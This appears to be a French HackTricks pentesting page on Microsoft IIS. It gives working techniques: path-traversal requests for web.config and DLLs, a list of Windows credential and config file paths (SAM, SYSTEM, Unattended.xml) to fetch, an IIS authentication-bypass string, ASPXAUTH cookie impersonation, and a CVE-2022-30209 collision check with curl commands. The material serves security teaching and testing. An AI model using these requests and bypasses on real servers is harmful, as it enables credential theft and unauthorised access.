# IIS - Internet Information Services

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

***

Testez les extensions de fichiers ex√©cutables :

* asp
* aspx
* config
* php

## Divulgation de l'adresse IP interne

Sur n'importe quel serveur IIS o√π vous obtenez un 302, vous pouvez essayer de supprimer l'en-t√™te Host et d'utiliser HTTP/1.0 et √† l'int√©rieur de la r√©ponse, l'en-t√™te Location pourrait vous indiquer l'adresse IP interne :
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
R√©ponse divulguant l'IP interne :
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Ex√©cuter des fichiers .config

Vous pouvez t√©l√©charger des fichiers .config et les utiliser pour ex√©cuter du code. Une fa√ßon de le faire est d'ajouter le code √† la fin du fichier √† l'int√©rieur d'un commentaire HTML : [T√©l√©chargez l'exemple ici](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Plus d'informations et de techniques pour exploiter cette vuln√©rabilit√© [ici](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Bruteforce de d√©couverte IIS

T√©l√©chargez la liste que j'ai cr√©√©e :

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Elle a √©t√© cr√©√©e en fusionnant le contenu des listes suivantes :

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Utilisez-le sans ajouter d'extension, les fichiers qui en ont besoin l'ont d√©j√†.

## Travers√©e de chemin

### Fuite de code source

Consultez l'analyse compl√®te sur : [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
En r√©sum√©, il y a plusieurs fichiers web.config √† l'int√©rieur des dossiers de l'application avec des r√©f√©rences aux fichiers "**assemblyIdentity**" et aux "**espaces de noms**". Avec ces informations, il est possible de savoir **o√π se trouvent les ex√©cutables** et de les t√©l√©charger.\
√Ä partir des **Dlls t√©l√©charg√©s**, il est √©galement possible de trouver de **nouveaux espaces de noms** auxquels vous devriez essayer d'acc√©der et obtenir le fichier web.config afin de trouver de nouveaux espaces de noms et assemblyIdentity.\
De plus, les fichiers **connectionstrings.config** et **global.asax** peuvent contenir des informations int√©ressantes.\\
{% endhint %}

Dans les applications **.Net MVC**, le fichier **web.config** joue un r√¥le crucial en sp√©cifiant chaque fichier binaire sur lequel l'application repose √† travers les balises XML **"assemblyIdentity"**.

### **Exploration des fichiers binaires**

Un exemple d'acc√®s au fichier **web.config** est pr√©sent√© ci-dessous :
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Ce demande r√©v√®le divers param√®tres et d√©pendances, tels que :

* Version d'**EntityFramework**
* **AppSettings** pour les pages web, la validation client et JavaScript
* Configurations de **System.web** pour l'authentification et l'ex√©cution
* Param√®tres des modules de **System.webServer**
* Liaisons d'assembly de **Runtime** pour de nombreuses biblioth√®ques comme **Microsoft.Owin**, **Newtonsoft.Json** et **System.Web.Mvc**

Ces param√®tres indiquent que certains fichiers, tels que **/bin/WebGrease.dll**, sont situ√©s dans le dossier /bin de l'application.

### **Fichiers du R√©pertoire Racine**

Les fichiers trouv√©s dans le r√©pertoire racine, comme **/global.asax** et **/connectionstrings.config** (qui contient des mots de passe sensibles), sont essentiels pour la configuration et le fonctionnement de l'application.

### **Espaces de Noms et Web.Config**

Les applications MVC d√©finissent √©galement des fichiers **web.config** suppl√©mentaires pour des espaces de noms sp√©cifiques afin d'√©viter des d√©clarations r√©p√©titives dans chaque fichier, comme le montre une demande de t√©l√©chargement d'un autre **web.config** :
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **T√©l√©chargement de DLLs**

La mention d'un espace de noms personnalis√© sugg√®re l'existence d'une DLL nomm√©e "**WebApplication1**" pr√©sente dans le r√©pertoire /bin. En suivant cela, une requ√™te pour t√©l√©charger le fichier **WebApplication1.dll** est affich√©e:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Cela sugg√®re la pr√©sence d'autres DLL essentielles, comme **System.Web.Mvc.dll** et **System.Web.Optimization.dll**, dans le r√©pertoire /bin.

Dans un sc√©nario o√π une DLL importe un espace de noms appel√© **WebApplication1.Areas.Minded**, un attaquant pourrait d√©duire l'existence d'autres fichiers web.config dans des chemins pr√©visibles, tels que **/nom-de-la-zone/Views/**, contenant des configurations sp√©cifiques et des r√©f√©rences √† d'autres DLL dans le dossier /bin. Par exemple, une requ√™te vers **/Minded/Views/web.config** peut r√©v√©ler des configurations et des espaces de noms indiquant la pr√©sence d'une autre DLL, **WebApplication1.AdditionalFeatures.dll**.

### Fichiers courants

Depuis [ici](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## Erreur 404 HTTPAPI 2.0

Si vous voyez une erreur comme celle-ci :

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Cela signifie que le serveur **n'a pas re√ßu le nom de domaine correct** dans l'en-t√™te Host.\
Pour acc√©der √† la page web, vous pourriez consulter le **certificat SSL** fourni et peut-√™tre trouver le nom de domaine/sous-domaine √† l'int√©rieur. S'il n'est pas l√†, vous devrez peut-√™tre **forcer VHosts** jusqu'√† ce que vous trouviez le bon.

## Anciennes vuln√©rabilit√©s IIS √† rechercher

### Vuln√©rabilit√©/Fonction du caract√®re tilde ‚Äú\~‚Äù de Microsoft IIS - Divulgation de noms de fichiers/dossiers courts

Vous pouvez essayer d'**√©num√©rer les dossiers et fichiers** √† l'int√©rieur de chaque dossier d√©couvert (m√™me s'il n√©cessite une authentification de base) en utilisant cette **technique**.\
La principale limitation de cette technique si le serveur est vuln√©rable est qu'elle **ne peut trouver que les 6 premi√®res lettres du nom de chaque fichier/dossier et les 3 premi√®res lettres de l'extension** des fichiers.

Vous pouvez utiliser [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) pour tester cette vuln√©rabilit√© : `java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

Recherche originale : [https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

Vous pouvez √©galement utiliser **metasploit** : `use scanner/http/iis_shortname_scanner`

### Contournement de l'authentification de base

**Contournez** une authentification de base (**IIS 7.5**) en essayant d'acc√©der √† : `/admin:$i30:$INDEX_ALLOCATION/admin.php` ou `/admin::$INDEX_ALLOCATION/admin.php`

Vous pouvez essayer de **combiner** cette **vuln√©rabilit√©** avec la pr√©c√©dente pour trouver de nouveaux **dossiers** et **contourner** l'authentification.

## D√©bogage activ√© Trace.AXD ASP.NET

ASP.NET inclut un mode de d√©bogage et son fichier s'appelle `trace.axd`.

Il conserve un journal tr√®s d√©taill√© de toutes les requ√™tes effectu√©es √† une application sur une p√©riode donn√©e.

Ces informations incluent les adresses IP distantes des clients, les ID de session, tous les cookies de requ√™te et de r√©ponse, les chemins physiques, les informations de code source, et potentiellement m√™me les noms d'utilisateur et les mots de passe.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## Cookie ASPXAUTH

ASPXAUTH utilise les informations suivantes :

* **`validationKey`** (cha√Æne) : cl√© encod√©e en hexad√©cimal √† utiliser pour la validation de la signature.
* **`decryptionMethod`** (cha√Æne) : (par d√©faut "AES").
* **`decryptionIV`** (cha√Æne) : vecteur d'initialisation encod√© en hexad√©cimal (par d√©faut un vecteur de z√©ros).
* **`decryptionKey`** (cha√Æne) : cl√© encod√©e en hexad√©cimal √† utiliser pour le d√©chiffrement.

Cependant, certaines personnes utiliseront les **valeurs par d√©faut** de ces param√®tres et utiliseront comme **cookie l'e-mail de l'utilisateur**. Par cons√©quent, si vous trouvez un site web utilisant la **m√™me plateforme** qui utilise le cookie ASPXAUTH et que vous **cr√©ez un utilisateur avec l'e-mail de l'utilisateur que vous souhaitez usurper** sur le serveur attaqu√©, vous pourriez √™tre en mesure d'utiliser **le cookie du deuxi√®me serveur dans le premier** et d'usurper l'utilisateur.\
Cette attaque a fonctionn√© dans ce [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## Contournement de l'authentification IIS avec des mots de passe mis en cache (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Rapport complet ici](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html) : Un bogue dans le code **ne v√©rifiait pas correctement le mot de passe fourni par l'utilisateur**, donc un attaquant dont le **hachage de mot de passe correspond √† une cl√©** d√©j√† dans le **cache** pourra se connecter en tant qu'utilisateur.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **malwares voleurs**.

Leur objectif principal est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de malwares volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
